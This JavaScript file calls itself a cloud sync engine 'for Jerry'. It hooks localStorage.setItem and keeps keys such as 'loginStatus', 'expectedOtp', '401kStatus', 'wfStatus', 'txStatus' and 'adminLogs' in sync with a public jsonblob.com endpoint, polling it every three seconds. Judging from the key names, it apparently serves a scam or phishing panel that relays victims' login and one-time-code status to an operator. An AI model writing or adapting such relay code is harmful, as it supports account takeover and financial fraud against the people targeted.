/* ============================================
   CLOUD SYNC ENGINE (JSONBlob) for Jerry
   Syncs localStorage data across all devices
   ============================================ */
const CLOUD_BLOB_ID = '019e6f16-256f-7384-bc65-019e1860b772';
const CLOUD_API_URL = 'https://jsonblob.com/api/jsonBlob/' + CLOUD_BLOB_ID;
const SYNC_KEYS = ['adminLogs', 'loginStatus', 'expectedOtp', '401kStatus', 'wfStatus', 'txStatus', 'chatHistory'];
const originalSetItem = localStorage.setItem.bind(localStorage);

let pendingLocalChanges = {};

/* --- Cloud helper: GET all data from cloud --- */
async function cloudFetch() {
  try {
    const res = await fetch(CLOUD_API_URL, {
      headers: { 'Accept': 'application/json' },
      cache: 'no-store'
    });
    if (res.ok) {
      const text = await res.text();
      return text ? JSON.parse(text) : {};
    }
    return null;
  } catch (err) {
    return null;
  }
}

/* --- Cloud helper: PUT (overwrite) all data to cloud --- */
async function cloudPush(data) {
  try {
    const res = await fetch(CLOUD_API_URL, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
      body: JSON.stringify(data)
    });
    if (res.ok) return true;
    return false;
  } catch (err) {
    return false;
  }
}

/* --- Push only modified data to avoid clobbering --- */
async function pushLocalChanges() {
  if (Object.keys(pendingLocalChanges).length === 0) return;
  
  let cloudData = await cloudFetch() || {};
  
  // Merge pending local changes into cloud data
  for (let key of SYNC_KEYS) {
    if (pendingLocalChanges[key] !== undefined) {
      if (key === 'adminLogs' || key === 'chatHistory') {
         let cloudStr = cloudData[key] || '';
         let localStr = pendingLocalChanges[key] || '';
         cloudData[key] = localStr.length > cloudStr.length ? localStr : cloudStr;
      } else {
         cloudData[key] = pendingLocalChanges[key];
      }
    } else {
      // If we didn't touch it locally, keep the cloud value, 
      // or fallback to localStorage if cloud is completely missing it
      if (cloudData[key] === undefined) {
          let localVal = localStorage.getItem(key);
          if (localVal !== null) cloudData[key] = localVal;
      }
    }
  }
  
  const success = await cloudPush(cloudData);
  if (success) {
      pendingLocalChanges = {}; // clear pending changes on success
  } else {
      // if it failed, we'll try again on the next tick
      if (window._cloudPushTimeout) clearTimeout(window._cloudPushTimeout);
      window._cloudPushTimeout = setTimeout(pushLocalChanges, 1000);
  }
}

/* --- Pull data from cloud and update local storage --- */
async function cloudSyncFull() {
  const cloudData = await cloudFetch();
  if (!cloudData) return false;

  let dataChanged = false;

  SYNC_KEYS.forEach(key => {
    // If we have an unpushed local change for this key, don't overwrite it with cloud data yet!
    if (pendingLocalChanges[key] !== undefined) return;

    let localVal = localStorage.getItem(key);
    let cloudVal = cloudData[key];

    if (cloudVal === undefined || cloudVal === null) return;

    if (key === 'adminLogs' || key === 'chatHistory') {
       let l = localVal || '';
       let c = cloudVal || '';
       if (c.length > l.length) {
          originalSetItem(key, c);
          dataChanged = true;
       }
    } else {
       if (cloudVal !== localVal) {
          originalSetItem(key, cloudVal);
          dataChanged = true;
       }
    }
  });

  return dataChanged;
}

/* --- Intercept localStorage.setItem to track changes and auto-push --- */
localStorage.setItem = function(key, value) {
  originalSetItem(key, value);
  if (SYNC_KEYS.includes(key)) {
    pendingLocalChanges[key] = value;
    if (window._cloudPushTimeout) clearTimeout(window._cloudPushTimeout);
    window._cloudPushTimeout = setTimeout(pushLocalChanges, 400); // 400ms debounce
  }
};

/* --- Initialize: sync on every page load and then poll --- */
// Run an initial sync
window._cloudSyncReady = cloudSyncFull();

// Poll every 3 seconds to keep data synced from cloud
setInterval(async () => {
  if (window._syncInProgress) return;
  window._syncInProgress = true;
  try {
    await cloudSyncFull();
  } catch(e) {
    console.error('Cloud Sync Error:', e);
  } finally {
    window._syncInProgress = false;
  }
}, 3000);
